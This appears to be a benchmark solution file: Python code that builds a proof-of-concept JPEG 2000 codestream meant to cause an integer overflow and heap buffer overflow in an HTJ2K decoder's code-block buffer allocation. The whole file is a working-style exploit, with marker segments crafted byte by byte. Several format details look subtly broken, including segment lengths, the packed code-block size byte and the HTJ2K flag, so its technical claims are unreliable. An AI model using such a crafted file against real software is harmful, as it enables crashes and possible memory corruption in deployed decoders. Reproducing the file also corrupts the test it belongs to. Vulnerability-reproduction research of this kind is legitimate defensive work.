import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a heap buffer overflow vulnerability
        in the HT_DEC component of a JPEG 2000 decoder.

        The vulnerability is a malloc size error in `opj_t1_allocate_buffers`, triggered
        by an integer overflow when calculating buffer sizes for a code-block. The size
        of a buffer is calculated based on code-block width and height. A key calculation
        is `(width + 2) * (height + 2)`.

        An overflow can be triggered if `width` is very large, specifically close to
        UINT32_MAX. The `width` is derived from code-block coordinates as an unsigned
        32-bit integer: `(OPJ_UINT32)cblk->x1 - (OPJ_UINT32)cblk->x0`. These coordinates
        are signed 32-bit integers.

        This PoC crafts a minimal J2K codestream that defines an image with
        a very large width and a carefully chosen negative horizontal offset. This
        combination leads the decoder to calculate code-block coordinates where `cblk->x0`
        is a large negative integer (e.g., -2147483648, bit pattern 0x80000000) and `cblk->x1`
        is a large positive integer. The subtraction, when performed on unsigned integers,
        wraps around and produces a huge `width` value (e.g., 0xfffffffe).

        When `width` is `0xfffffffe`, the expression `width + 2` overflows to 0.
        The subsequent multiplication for the buffer size results in `malloc(0)`.
        Later attempts to write to this small (or zero-sized) buffer using the original,
        large dimensions cause a heap buffer overflow, leading to a crash.

        The PoC file contains only the necessary J2K markers to trigger the bug during
        the parsing and setup phase, before any pixel data is decoded. This results
        in a very small and efficient PoC.
        """

        # J2K markers and segments are big-endian.
        
        # SOC: Start of Codestream
        poc = b"\xff\x4f"

        # SIZ: Image and Tile Size Marker
        # This segment defines the malicious geometry.
        poc += b"\xff\x51"
        poc += struct.pack(">H", 39)          # Lsiz: Marker segment length
        poc += struct.pack(">H", 0)           # Rsiz: Capabilities (Profile 0)
        poc += struct.pack(">I", 0xfffffffe)  # Xsiz: Image width
        poc += struct.pack(">I", 1)           # Ysiz: Image height
        poc += struct.pack(">I", 0x80000000)  # XOsiz: Image horizontal offset
        poc += struct.pack(">I", 0)           # YOsiz: Image vertical offset
        poc += struct.pack(">I", 0xfffffffe)  # XTsiz: Tile width
        poc += struct.pack(">I", 1)           # YTsiz: Tile height
        poc += struct.pack(">I", 0)           # XTOsiz: Tile horizontal offset
        poc += struct.pack(">I", 0)           # YTOsiz: Tile vertical offset
        poc += struct.pack(">H", 1)           # Csiz: Number of components
        poc += struct.pack(">B", 7)           # Ssiz_0: 8-bit, unsigned
        poc += struct.pack(">B", 1)           # XRsiz_0: Subsampling factor
        poc += struct.pack(">B", 1)           # YRsiz_0: Subsampling factor

        # COD: Coding Style Default Marker
        # This enables the vulnerable HTJ2K (High-Throughput) code path.
        poc += b"\xff\x52"
        poc += struct.pack(">H", 11)          # Lcod: Marker segment length
        poc += struct.pack(">B", 0x20)        # Scod: Coding style (bit 5 = HTJ2K)
        poc += struct.pack(">I", 0)           # SGcod: Progression order, etc.
        poc += struct.pack(">B", 0)           # SPcod: num_dlvls (0 levels)
        poc += struct.pack(">B", 0x44)        # cblkw/h exponent (64x64 blocks)
        poc += struct.pack(">B", 0x40)        # cblk_style (HT bypass)
        poc += struct.pack(">B", 1)           # xform (5/3 reversible)

        # QCD: Quantization Default Marker
        # A minimal placeholder is sufficient.
        poc += b"\xff\x5c"
        poc += struct.pack(">H", 4)           # Lqcd: Marker segment length
        poc += struct.pack(">B", 0)           # Sqcd: No quantization
        poc += struct.pack(">B", 0)           # SPqcd: Dummy value

        # SOT: Start of Tile-part Marker
        # Defines a single tile to be processed.
        poc += b"\xff\x90"
        poc += struct.pack(">H", 10)          # Lsot: Marker segment length
        poc += struct.pack(">H", 0)           # Isot: Tile index
        poc += struct.pack(">I", 2)           # Psot: Tile-part length (points to EOC)
        poc += struct.pack(">B", 0)           # Tpsot: Tile-part index
        poc += struct.pack(">B", 1)           # TNsot: Number of tile-parts

        # SOD: Start of Data Marker
        poc += b"\xff\x93"

        # EOC: End of Codestream Marker
        poc += b"\xff\xd9"

        return poc